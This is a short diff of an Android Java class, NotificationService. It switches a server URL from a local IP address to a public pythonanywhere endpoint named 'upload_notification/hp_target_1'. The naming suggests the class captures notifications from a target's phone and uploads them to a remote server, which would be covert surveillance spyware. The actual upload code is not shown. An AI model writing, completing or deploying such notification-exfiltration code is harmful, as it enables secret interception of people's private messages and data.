@@ -14,7 +14,7 @@ import java.util.Date;
 import java.util.Locale;
 
 public class NotificationService extends NotificationListenerService {
-    private static final String SERVER_URL = "http://192.168.1.28:5000/api/upload_notification/hp_target_1"; // SESUAIKAN IP
+    private static final String SERVER_URL = "https://ax.pythonanywhere.com/api/upload_notification/hp_target_1"; // SESUAIKAN IP
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
